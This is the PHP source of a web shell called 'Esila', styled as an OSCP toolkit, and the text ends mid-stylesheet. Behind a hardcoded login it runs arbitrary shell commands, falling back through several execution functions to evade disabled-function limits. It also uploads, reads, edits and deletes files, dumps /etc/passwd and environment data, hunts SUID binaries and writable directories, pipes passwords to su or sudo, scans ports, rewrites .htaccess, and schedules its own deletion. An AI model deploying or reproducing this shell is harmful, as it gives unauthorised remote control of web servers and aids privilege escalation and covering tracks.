<?php
$php_works = true;
error_reporting(0);

// PHP 5.6+ polyfills
if (!function_exists('str_contains')) { function str_contains($h,$n){return $n===''||strpos($h,$n)!==false;} }
if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }

// Session hardening
if(!headers_sent()){@session_start();}
if(!isset($_SESSION)){$_SESSION=array();}

define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
define('DEFAULT_USER', 'shell');
define('DEFAULT_PASS', 'shell');
define('VERSION', '2.2');

// Universal command execution - tries multiple methods
function esila_exec($cmd) {
    $out = '';
    $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $out = @shell_exec($cmd);
    } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
        @exec($cmd, $arr); $out = implode("\n", $arr);
    } elseif (function_exists('system') && !in_array('system', $disabled)) {
        ob_start(); @system($cmd); $out = ob_get_clean();
    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
        ob_start(); @passthru($cmd); $out = ob_get_clean();
    } elseif (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $desc = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) { $out = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]); fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]); proc_close($p); }
    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
        $p = @popen($cmd, 'r');
        if (is_resource($p)) { $out = stream_get_contents($p); pclose($p); }
    }
    return ($out !== null && $out !== false) ? $out : '';
}

// .htaccess fix endpoint
if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
    header('Content-Type: application/json');
    $dir = dirname(__FILE__);
    $mode = isset($_POST['mode']) ? $_POST['mode'] : 'module';
    if ($mode === 'cgi') {
        $content = "Options +ExecCGI\nAddHandler cgi-script .php\n";
    } else {
        $content = "AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .php5 .php7 .phtml\n\n<IfModule mod_rewrite.c>\n    RewriteEngine On\n</IfModule>\n\n<FilesMatch \"\\.php$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n";
    }
    $ok = @file_put_contents($dir . '/.htaccess', $content);
    echo json_encode(['ok' => $ok !== false, 'mode' => $mode]);
    exit;
}

// --- API HANDLERS (before any HTML output) ---

// Self destruct
if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
    header('Content-Type: application/json');
    $minutes = intval(isset($_POST['minutes']) ? $_POST['minutes'] : 0);
    if ($minutes > 0 && $minutes <= 1440) {
        $delay = $minutes * 60;
        $self = __FILE__;
        if (IS_WIN) {
            esila_exec("start /b cmd /c \"timeout /t $delay /nobreak >nul & del /f " . escapeshellarg($self) . "\"");
        } else {
            esila_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
        }
        echo json_encode(['ok' => true, 'msg' => "Self destruct in $minutes minutes"]);
    } else {
        echo json_encode(['ok' => false, 'msg' => 'Invalid minutes (1-1440)']);
    }
    exit;
}

// Download handler
if (isset($_GET['download'])) {
    if (!isset($_SESSION['logged_in'])) exit;
    $path = $_GET['download'];
    if (file_exists($path) && is_file($path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
    } else {
        echo "File not found.";
    }
    exit;
}

// Login
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === DEFAULT_USER && $_POST['password'] === DEFAULT_PASS) {
            $_SESSION['logged_in'] = true;
            $_SESSION['cwd'] = getcwd();
            $_SESSION['history'] = array();
            @setcookie('esila_auth', md5(DEFAULT_USER . ':' . DEFAULT_PASS), time() + 86400, '/');
            header('Location: ?');
            exit;
        } else {
            $login_error = "Invalid credentials";
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Esila</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes bgShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,122,255,0.1)}50%{box-shadow:0 0 30px rgba(0,122,255,0.25)}}
body{background:linear-gradient(135deg,#0d1117,#161b22,#0d1117,#1a1e24);background-size:400% 400%;animation:bgShift 20s ease infinite;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(rgba(255,255,255,0.03) 1px,transparent 1px);background-size:24px 24px;pointer-events:none;z-index:0}
.login-box{position:relative;background:rgba(22,27,34,0.85);backdrop-filter:blur(24px) saturate(1.4);-webkit-backdrop-filter:blur(24px) saturate(1.4);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:48px 40px;width:380px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.5);z-index:1;transition:border-color .3s}
.login-box:hover{border-color:rgba(0,122,255,0.2)}
.login-box h1{font-size:32px;font-weight:700;margin-bottom:6px;background:linear-gradient(135deg,#007AFF,#5856D6,#bc8cff);background-size:200% 200%;animation:bgShift 4s ease infinite;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.login-box p.sub{color:#8b949e;font-size:13px;margin-bottom:32px}
.login-box input{width:100%;padding:12px 16px;margin-bottom:14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:10px;color:#e6edf3;font-size:15px;outline:none;transition:all .2s}
.login-box input:focus{border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.15)}
.login-box button{width:100%;padding:12px;background:linear-gradient(135deg,#007AFF,#5856D6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:all .3s;animation:pulse 3s ease infinite}
.login-box button:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(0,122,255,0.4)}
.err{color:#f85149;font-size:13px;margin-bottom:12px}
.php-fix-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);z-index:9999;display:flex;align-items:center;justify-content:center}
.php-fix-box{background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:480px;width:90%;text-align:center}
.php-fix-box h2{color:#f85149;margin-bottom:12px}
.php-fix-box p{color:#8b949e;font-size:14px;margin-bottom:16px;line-height:1.6}
.php-fix-box button{padding:10px 20px;border-radius:10px;border:none;font-size:14px;font-weight:600;cursor:pointer;margin:4px;transition:all .2s}
.php-fix-box .fix-btn{background:#007AFF;color:#fff}
.php-fix-box .fix-btn:hover{background:#0062cc}
.php-fix-box .fix-cgi{background:rgba(255,255,255,0.08);color:#e6edf3;border:1px solid rgba(255,255,255,0.1)}
.php-fix-status{margin-top:12px;font-size:13px;color:#3fb950}
</style></head><body>
<!-- PHP Detection: if PHP isn't processing, this literal tag will appear in the DOM -->
<span id="php-check" style="display:none"><?php echo 'PHP_OK'; ?></span>
<script>
document.addEventListener('DOMContentLoaded', function() {
    var check = document.getElementById('php-check');
    if (!check || check.textContent.trim() !== 'PHP_OK') {
        var overlay = document.createElement('div');
        overlay.className = 'php-fix-overlay';
        overlay.innerHTML = '<div class="php-fix-box">' +
            '<h2>PHP Not Executing</h2>' +
            '<p>This file is not being processed as PHP by the web server. The raw PHP code is being displayed instead of executed.</p>' +
            '<p>Click below to attempt an automatic fix by creating an .htaccess file:</p>' +
            '<button class="fix-btn" onclick="fixHtaccess(\'module\')">Fix: Apache mod_php</button>' +
            '<button class="fix-cgi" onclick="fixHtaccess(\'cgi\')">Fix: CGI Mode</button>' +
            '<div class="php-fix-status" id="fix-status"></div>' +
            '</div>';
        document.body.appendChild(overlay);
    }
});
function fixHtaccess(mode) {
    var status = document.getElementById('fix-status');
    if (mode === 'module') {
        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .php5 .php7 .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code>';
    } else {
        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">Options +ExecCGI\nAddHandler cgi-script .php</code>';
    }
    status.style.color = '#d29922';
}
</script>
<div class="login-box">
    <h1>Esila</h1>
    <p class="sub">Web Terminal v<?= VERSION ?> &middot; OSCP Toolkit</p>
    <?php if (!empty($login_error)) echo "<p class='err'>$login_error</p>"; ?>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
</div>
</body></html>
    <?php
    exit;
}

// Authenticated API endpoints
if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
$cwd = $_SESSION['cwd'];

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Autocomplete
if (isset($_POST['autocomplete'])) {
    $input = $_POST['autocomplete'];
    $parts = preg_split('/\s+/', $input);
    $last = end($parts);
    $dir = $cwd; $prefix = ''; $partial = $last;
    if (str_contains($last, '/')) {
        $pp = explode('/', $last);
        $partial = array_pop($pp);
        $prefix = implode('/', $pp);
        $dir = realpath($cwd . '/' . $prefix);
        if (!$dir || !is_dir($dir)) exit;
    }
    $results = [];
    foreach (@scandir($dir) as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (str_starts_with(strtolower($entry), strtolower($partial))) {
            $results[] = ($prefix !== '' ? $prefix . '/' : '') . $entry . (is_dir($dir . '/' . $entry) ? '/' : '');
        }
    }
    echo implode("\n", $results);
    exit;
}

// Switch user
if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
    header('Content-Type: application/json');
    $su_user = isset($_POST['su_user']) ? trim($_POST['su_user']) : '';
    $su_pass = isset($_POST['su_pass']) ? $_POST['su_pass'] : '';
    if ($su_user === '') {
        unset($_SESSION['su_user'], $_SESSION['su_pass']);
        echo json_encode(array('ok' => true, 'msg' => 'Switched back to default user', 'user' => trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))));
        exit;
    }
    if (IS_WIN) {
        $test = esila_exec('powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c whoami\' -NoNewWindow -Wait -RedirectStandardOutput C:\\Windows\\Temp\\esila_su.txt 2>&1;Get-Content C:\\Windows\\Temp\\esila_su.txt;Remove-Item C:\\Windows\\Temp\\esila_su.txt -Force" 2>&1');
    } else {
        $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
        if (strpos($test, $su_user) === false) {
            $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
        }
    }
    $test = trim($test);
    if (strpos($test, $su_user) !== false || strpos($test, strtolower($su_user)) !== false) {
        $_SESSION['su_user'] = $su_user;
        $_SESSION['su_pass'] = $su_pass;
        echo json_encode(array('ok' => true, 'msg' => 'Switched to ' . $su_user, 'user' => $su_user));
    } else {
        echo json_encode(array('ok' => false, 'msg' => 'Failed: ' . $test, 'user' => ''));
    }
    exit;
}

// Command execution
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd === '') exit;
    $_SESSION['history'][] = $cmd;
    if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '' || $target === '~') $new = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
        elseif ($target[0] === '/') $new = realpath($target);
        else $new = realpath($cwd . '/' . $target);
        if ($new && is_dir($new)) {
            $_SESSION['cwd'] = $new;
            echo "__CWD__:" . $new;
        } else {
            echo "cd: no such file or directory: $target\n";
        }
        exit;
    }
    // Build exec command with optional user context
    $su_user = isset($_SESSION['su_user']) ? $_SESSION['su_user'] : '';
    $su_pass = isset($_SESSION['su_pass']) ? $_SESSION['su_pass'] : '';
    if (IS_WIN) {
        $basecmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    } else {
        $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    }
    if ($su_user !== '') {
        if (IS_WIN) {
            $exec = 'powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c ' . addslashes($basecmd) . '\' -NoNewWindow -Wait -RedirectStandardOutput C:\\Windows\\Temp\\esila_out.txt -RedirectStandardError C:\\Windows\\Temp\\esila_err.txt;Get-Content C:\\Windows\\Temp\\esila_out.txt,C:\\Windows\\Temp\\esila_err.txt;Remove-Item C:\\Windows\\Temp\\esila_out.txt,C:\\Windows\\Temp\\esila_err.txt -Force -ErrorAction SilentlyContinue" 2>&1';
        } else {
            $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
        }
    } else {
        $exec = $basecmd;
    }
    echo esila_exec($exec);
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    header('Content-Type: application/json');
    $dest = (isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd) . '/' . basename($_FILES['upload']['name']);
    echo json_encode(['ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)]);
    exit;
}

// File manager API
if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
    header('Content-Type: application/json');
    $path = isset($_POST['path']) ? $_POST['path'] : $cwd;
    if (!is_dir($path)) { echo json_encode(['error' => 'Not a directory']); exit; }
    $items = [];
    foreach (@scandir($path) as $f) {
        if ($f === '.') continue;
        $fp = $path . '/' . $f;
        $stat = @stat($fp);
        $items[] = [
            'name' => $f,
            'path' => realpath($fp) ?: $fp,
            'is_dir' => is_dir($fp),
            'size' => is_file($fp) ? filesize($fp) : 0,
            'perms' => substr(sprintf('%o', @fileperms($fp)), -4),
            'mtime' => $stat ? date('Y-m-d H:i', $stat['mtime']) : '',
            'readable' => is_readable($fp),
            'writable' => is_writable($fp),
        ];
    }
    echo json_encode(['path' => realpath($path), 'items' => $items]);
    exit;
}

// File actions
if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
    header('Content-Type: application/json');
    $type = isset($_POST['type']) ? $_POST['type'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    switch ($type) {
        case 'delete':
            echo json_encode(['ok' => is_dir($path) ? @rmdir($path) : @unlink($path)]);
            break;
        case 'rename':
            echo json_encode(['ok' => @rename($path, dirname($path) . '/' . basename(isset($_POST['newname']) ? $_POST['newname'] : ''))]);
            break;
        case 'chmod':
            echo json_encode(['ok' => @chmod($path, octdec(isset($_POST['mode']) ? $_POST['mode'] : '0644'))]);
            break;
        case 'read':
            if (is_file($path) && is_readable($path) && filesize($path) < 2097152) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($path), 'name' => basename($path)]);
            } else {
                echo json_encode(['ok' => false, 'msg' => 'Cannot read file (too large or not readable)']);
            }
            break;
        case 'write':
            echo json_encode(['ok' => @file_put_contents($path, isset($_POST['content']) ? $_POST['content'] : '') !== false]);
            break;
        case 'mkdir':
            echo json_encode(['ok' => @mkdir($path, 0755, true)]);
            break;
        default:
            echo json_encode(['error' => 'Unknown action']);
    }
    exit;
}

// System info
if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        $info = [
            'os' => php_uname(),
            'kernel' => php_uname('r'),
            'hostname' => gethostname(),
            'user' => trim(esila_exec('whoami 2>nul')),
            'uid' => trim(esila_exec('whoami /priv 2>nul')),
            'groups' => trim(esila_exec('whoami /groups 2>nul')),
            'ip_addrs' => trim(esila_exec('ipconfig 2>nul')),
            'uptime' => trim(esila_exec('net stats srv 2>nul | findstr "since"')),
            'disk' => trim(esila_exec('wmic logicaldisk get caption,size,freespace 2>nul')),
            'interfaces' => trim(esila_exec('ipconfig /all 2>nul')),
            'env' => trim(esila_exec('set 2>nul')),
            'processes' => trim(esila_exec('tasklist /V 2>nul')),
            'passwd' => 'N/A on Windows',
            'crontab' => trim(esila_exec('schtasks /query 2>nul')),
            'php_ver' => phpversion(),
            'php_disabled' => ini_get('disable_functions'),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
        ];
    } else {
        $info = [
            'os' => php_uname(),
            'kernel' => php_uname('r'),
            'hostname' => gethostname(),
            'user' => trim(esila_exec('whoami 2>/dev/null')),
            'uid' => trim(esila_exec('id 2>/dev/null')),
            'groups' => trim(esila_exec('groups 2>/dev/null')),
            'ip_addrs' => trim(esila_exec("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
            'uptime' => trim(esila_exec('uptime 2>/dev/null')),
            'disk' => trim(esila_exec('df -h 2>/dev/null')),
            'interfaces' => trim(esila_exec('ip -br addr 2>/dev/null || ifconfig 2>/dev/null')),
            'env' => trim(esila_exec('env 2>/dev/null')),
            'processes' => trim(esila_exec('ps aux --sort=-%mem 2>/dev/null | head -30')),
            'passwd' => @file_get_contents('/etc/passwd'),
            'crontab' => trim(esila_exec('crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')),
            'php_ver' => phpversion(),
            'php_disabled' => ini_get('disable_functions'),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
        ];
    }
    echo json_encode($info);
    exit;
}

// SUID finder
if (isset($_POST['action']) && $_POST['action'] === 'find_suid') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        echo json_encode(['result' => 'SUID is a Linux concept. On Windows, check: icacls, accesschk, or service permissions.']);
    } else {
        echo json_encode(['result' => trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))]);
    }
    exit;
}

// Writable dirs finder
if (isset($_POST['action']) && $_POST['action'] === 'find_writable') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        echo json_encode(['result' => trim(esila_exec('icacls C:\\ /findsid Everyone /T 2>nul | findstr /I "Everyone" | head -50'))]);
    } else {
        echo json_encode(['result' => trim(esila_exec('find / -writable -type d 2>/dev/null | head -50'))]);
    }
    exit;
}

// Network tools
if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
    header('Content-Type: application/json');
    $tool = isset($_POST['tool']) ? $_POST['tool'] : '';
    $target = isset($_POST['target']) ? $_POST['target'] : '';
    $target = preg_replace('/[^a-zA-Z0-9.\-:\/]/', '', $target);
    $out = '';
    $t = escapeshellarg($target);
    switch ($tool) {
        case 'ping':
            $out = esila_exec(IS_WIN ? "ping -n 4 $t 2>&1" : "ping -c 4 $t 2>&1");
            break;
        case 'portscan':
            $ports = array(21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,8080,8443);
            $result = '';
            foreach ($ports as $p) {
                $fp = @fsockopen($target, $p, $errno, $errstr, 1);
                if ($fp) { $result .= "Port $p: OPEN\n"; fclose($fp); }
            }
            $out = $result ? $result : "No open ports found on common ports.";
            break;
        case 'traceroute':
            $out = esila_exec(IS_WIN ? "tracert $t 2>&1" : "traceroute $t 2>&1 || tracepath $t 2>&1");
            break;
        case 'dns':
            $out = esila_exec(IS_WIN ? "nslookup $t 2>&1" : "nslookup $t 2>&1 || dig $t 2>&1 || host $t 2>&1");
            break;
        case 'arp':
            $out = esila_exec("arp -a 2>&1");
            break;
        case 'curl':
            $out = esila_exec("curl -sI $t 2>&1");
            break;
    }
    echo json_encode(['result' => $out]);
    exit;
}

// Change password
if (isset($_POST['action']) && $_POST['action'] === 'chpass') {
    header('Content-Type: application/json');
    echo json_encode(['ok' => true, 'msg' => 'Password change requires file edit (hardcoded credentials)']);
    exit;
}

// Collect page data
$username = trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null')) ?: (function_exists('get_current_user') ? get_current_user() : 'unknown');
$hostname = trim(esila_exec(IS_WIN ? 'hostname 2>nul' : 'hostname 2>/dev/null')) ?: (function_exists('gethostname') ? gethostname() : 'unknown');
$home = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
$history = $_SESSION['history'];
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Esila - <?= htmlspecialchars($hostname) ?></title>
<style>
:root {
    --bg: #0d1117;
    --surface: rgba(22,27,34,0.85);
    --surface-solid: #161b22;
    --border: rgba(255,255,255,0.08);
    --border-hover: rgba(255,255,255,0.15);
    --text: #e6edf3;
    --text-secondary: #8b949e;
    --text-dim: #484f58;
    --accent: #007AFF;
    --accent-hover: #0062cc;
    --green: #3fb950;
    --orange: #d29922;
    --red: #f85149;
    --purple: #bc8cff;
    --cyan: #79c0ff;
    --pink: #f778ba;
    --radius: 12px;
    --radius-sm: 8px;
    --glass-blur: blur(20px) saturate(1.4);
    --sidebar-width: 240px;
    --font-mono: 'SF Mono','Fira Code','Cascadia Code','JetBrains Mono',monospace;
}
* { margin:0; padding:0; box-sizing:border-box; }
@keyframes bgShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
@keyframes glowPulse{0%,100%{box-shadow:0 0 8px rgba(0,122,255,0.15)}50%{box-shadow:0 0 16px rgba(0,122,255,0.3)}}
body { background:linear-gradient(135deg,#0d1117,#161b22,#0d1117,#131820);background-size:400% 400%;animation:bgShift 25s ease infinite; color:var(--text); font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif; overflow:hidden; height:100vh; }
body::before { content:''; position:fixed; inset:0; background-image:radial-gradient(rgba(255,255,255,0.025) 1px,transparent 1px); background-size:20px 20px; pointer-events:none; z-index:0; }
::-webkit-scrollbar { width:5px; }
::-webkit-scrollbar-track { background:transparent; }
::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.12); border-radius:3px; }
::-webkit-scrollbar-thumb:hover { background:rgba(255,255,255,0.2); }
::selection { background:rgba(0,122,255,0.3); }

/* Top bar */
.topbar { height:36px; background:rgba(13,17,23,0.95); border-bottom:1px solid var(--border); display:flex; align-items:center; padding:0 16px; font-size:12px; color:var(--text-dim); gap:16px; flex-shrink:0; z-index:50; backdrop-filter:blur(12px); }
.topbar .tb-accent { color:var(--accent); font-weight:500; }
.topbar .tb-path { color:var(--text-secondary); font-family:var(--font-mono); font-size:11px; }
.topbar .spacer { flex:1; }
.topbar .clock { font-family:var(--font-mono); color:var(--text-secondary); }

/* Layout */
.app { display:flex; height:100vh; flex-direction:column; }
.app-body { display:flex; flex:1; overflow:hidden; }
.sidebar { width:var(--sidebar-width); background:linear-gradient(180deg,rgba(22,27,34,0.9),rgba(13,17,23,0.95)); backdrop-filter:var(--glass-blur); -webkit-backdrop-filter:var(--glass-blur); border-right:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; transition:width .3s ease,transform .3s ease; z-index:100; }
.sidebar.collapsed { width:60px; }
.sidebar.collapsed .nav-label, .sidebar.collapsed .sidebar-header span, .sidebar.collapsed .sidebar-footer span { display:none; }
.sidebar-header { padding:20px 16px; display:flex; align-items:center; gap:12px; border-bottom:1px solid var(--border); }
.sidebar-header .logo { font-size:22px; font-weight:700; background:linear-gradient(135deg,#007AFF,#5856D6,#bc8cff);background-size:200% 200%;animation:bgShift 4s ease infinite;-webkit-background-clip:text;-webkit-text-fill-color:transparent; white-space:nowrap; }
.sidebar-header .ver { font-size:11px; color:var(--text-dim); }
.toggle-btn { background:none; border:none; color:var(--text-secondary); cursor:pointer; padding:6px; border-radius:6px; transition:background .2s; margin-left:auto; }
.toggle-btn:hover { background:rgba(255,255,255,0.08); }
.toggle-btn svg { width:18px; height:18px; }

.nav { flex:1; padding:8px; overflow-y:auto; }
.nav-item { display:flex; align-items:center; gap:12px; padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; color:var(--text-secondary); transition:all .2s; font-size:14px; white-space:nowrap; user-select:none; position:relative; }
.nav-item:hover { background:rgba(255,255,255,0.06); color:var(--text); }
.nav-item.active { background:rgba(0,122,255,0.12); color:var(--accent); }
.nav-item.active::before { content:''; position:absolute; left:0; top:50%; transform:translateY(-50%); width:3px; height:20px; background:var(--accent); border-radius:0 3px 3px 0; box-shadow:0 0 8px rgba(0,122,255,0.4); }
.nav-item svg { width:20px; height:20px; flex-shrink:0; }
.nav-label { overflow:hidden; }

.sidebar-footer { padding:12px 16px; border-top:1px solid var(--border); }
.sidebar-footer .user-info { display:flex; align-items:center; gap:8px; font-size:13px; color:var(--text-secondary); }
.sidebar-footer .user-dot { width:8px; height:8px; background:var(--green); border-radius:50%; box-shadow:0 0 6px rgba(63,185,80,0.5); }

/* Main content */
.main { flex:1; display:flex; flex-direction:column; overflow:hidden; min-width:0; }
.panel { display:none; flex:1; flex-direction:column; overflow:hidden; }
.panel.active { display:flex; animation:fadeIn .2s ease; }

/* Panel header / toolbar */
.panel-header { padding:12px 20px; display:flex; align-items:center; gap:12px; border-bottom:1px solid var(--border); background:var(--surface); backdrop-filter:var(--glass-blur); flex-shrink:0; min-height:52px; flex-wrap:wrap; }
.panel-title { font-size:16px; font-weight:600; white-space:nowrap; }
.panel-header .spacer { flex:1; }

/* Buttons */
.btn { padding:6px 14px; border-radius:var(--radius-sm); border:1px solid var(--border); background:rgba(255,255,255,0.04); color:var(--text); font-size:13px; cursor:pointer; transition:all .2s; white-space:nowrap; font-family:inherit; }
.btn:hover { background:rgba(255,255,255,0.08); border-color:var(--border-hover); }
.btn-primary { background:var(--accent); border-color:var(--accent); color:#fff; }
.btn-primary:hover { background:var(--accent-hover); }
.btn-danger { background:rgba(248,81,73,0.15); border-color:rgba(248,81,73,0.3); color:var(--red); }
.btn-danger:hover { background:rgba(248,81,73,0.25); }
.btn-sm { padding:4px 10px; font-size:12px; }
.btn-icon { padding:6px; display:flex; align-items:center; justify-content:center; }

/* Inputs */
.input { padding:8px 12px; border-radius:var(--radius-sm); border:1px solid var(--border); background:rgba(255,255,255,0.04); color:var(--text); font-size:14px; outline:none; transition:border-color .2s; font-family:inherit; }
.input:focus { border-color:var(--accent); }
.input-sm { padding:6px 10px; font-size:13px; }
select.input { cursor:pointer; }

/* Tags/badges */
.badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:11px; font-weight:600; }
.badge-green { background:rgba(63,185,80,0.15); color:var(--green); }
.badge-orange { background:rgba(210,153,34,0.15); color:var(--orange); }
.badge-red { background:rgba(248,81,73,0.15); color:var(--red); }
.badge-purple { background:rgba(188,140,255,0.15); color:var(--purple); }
.badge-blue { background:rgba(0,122,255,0.15); color:var(--accent); }
.badge-cyan { background:rgba(121,192,255,0.15); color:var(--cyan); }
.badge-pink { background:rgba(247,120,186,0.15); color:var(--pink); }

/* Cards */
.card { background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:16px; transition:all .25s ease; box-shadow:0 4px 16px rgba(0,0,0,0.2); }
.card:hover { border-color:var(--border-hover); transform:translateY(-2px); box-shadow:0 8px 32px rgba(0,0,0,0.3); }

/* Code block */
.code-box { background:#010409; border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px 14px; font-family:var(--font-mono); font-size:13px; color:var(--text); white-space:pre-wrap; word-break:break-all; overflow-x:auto; position:relative; line-height:1.5; }
.code-box .copy-btn { position:absolute; top:8px; right:8px; padding:4px 8px; font-size:11px; }

/* Tabs */
.tabs { display:flex; gap:4px; padding:0 4px; }
.tab { padding:6px 14px; border-radius:var(--radius-sm) var(--radius-sm) 0 0; cursor:pointer; color:var(--text-secondary); font-size:13px; transition:all .2s; border:1px solid transparent; border-bottom:none; user-select:none; }
.tab:hover { color:var(--text); background:rgba(255,255,255,0.04); }
.tab.active { color:var(--accent); background:var(--surface-solid); border-color:var(--border); }

/* Terminal panel */
#terminal-container { flex:1; display:flex; flex-direction:column; overflow:hidden; background:#010409; }
#term-output { flex:1; padding:12px 14px; font-family:var(--font-mono); font-size:14px; line-height:1.5; color:#e6edf3; overflow-y:auto; white-space:pre-wrap; word-break:break-all; cursor:text; }
#term-output .prompt-user { color:#007AFF; font-weight:bold; }
#term-output .prompt-host { color:#bc8cff; font-weight:bold; }
#term-output .prompt-path { color:#3fb950; font-weight:bold; }
#term-input-line { display:flex; align-items:center; padding:0 14px 10px; background:#010409; font-family:var(--font-mono); font-size:14px; gap:0; flex-shrink:0; }
#term-input-line .prompt-static { white-space:nowrap; }
